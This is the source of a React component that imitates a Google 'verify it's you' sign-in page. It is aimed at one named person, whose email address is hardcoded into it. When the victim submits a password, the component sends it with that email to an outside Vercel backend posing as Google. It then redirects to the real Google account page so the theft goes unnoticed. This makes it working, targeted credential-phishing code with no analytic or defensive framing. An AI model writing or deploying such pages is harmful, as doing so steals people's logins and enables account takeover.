import { useState } from 'react'
import axios from 'axios'
import './GoogleLogin.css'

const GoogleLogin = () => {
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const email = 'rmanjuntha@rgipt.ac.in'

  const handleSubmit = async (e) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    try {
      const response = await axios.post('https://google-backend-blond.vercel.app/api/auth/login', {
        email,
        password
      })

      if (response.data.success) {
        window.location.href = 'https://myaccount.google.com/'
      }
    } catch (error) {
      setError(error.response?.data?.message || 'Login failed')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="login-container">
      <div className="login-card">
        <div className="card-header">
          {/* Google G SVG */}
          <svg className="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true">
            <path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303C33.731 32.91 29.267 36 24 36c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C33.64 6.053 28.978 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20c10.493 0 19-8.507 19-19 0-1.341-.139-2.651-.389-3.917z"/>
            <path fill="#FF3D00" d="M6.306 14.691l6.571 4.814C14.655 16.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C33.64 6.053 28.978 4 24 4c-7.735 0-14.373 4.402-17.694 10.691z"/>
            <path fill="#4CAF50" d="M24 44c5.17 0 9.86-1.977 13.409-5.191l-6.197-5.238C29.158 35.091 26.715 36 24 36c-5.239 0-9.717-3.367-11.32-8.043l-6.55 5.047C9.42 39.556 16.14 44 24 44z"/>
            <path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-1.026 3.06-3.201 5.623-6.091 7.048.002-.001 6.197 5.238 6.197 5.238l.429.031C39.525 36.889 44 31.095 44 24c0-1.341-.139-2.651-.389-3.917z"/>
          </svg>
        </div>

        <div className="main-content">
          <div className="left-section">
            <h1 className="greeting">Hi Saurabh </h1>
            <div className="email-display">
              <div className="profile-info">
                <div className="avatar-icon">S</div>
                <span className="email">{email}</span>
                <button type="button" className="dropdown-arrow" aria-label="Choose account">▼</button>
              </div>
            </div>
          </div>

          <div className="right-section">
            <div className="verification-text">To continue, first verify it's you</div>
            <div className="language-selector-top">
              <select className="language-selector" aria-label="Language">
                <option>English (United States)</option>
              </select>
            </div>

            <form onSubmit={handleSubmit} className="login-form">
              <div className="password-field">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  className="password-input"
                  required
                />
              </div>

              <div className="show-password">
                <input
                  type="checkbox"
                  id="showPassword"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <label htmlFor="showPassword">Show password</label>
              </div>

              {error && <div className="error-message">{error}</div>}

              <div className="form-actions">
                <button type="button" className="forgot-password">Forgot password?</button>
                <button type="submit" className="next-button" disabled={loading || !password}>
                  {loading ? 'Loading...' : 'Next'}
                </button>
              </div>
            </form>
          </div>
        </div>

        <div className="footer">
          <div className="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
        </div>
      </div>
    </div>
  )
}

export default GoogleLogin
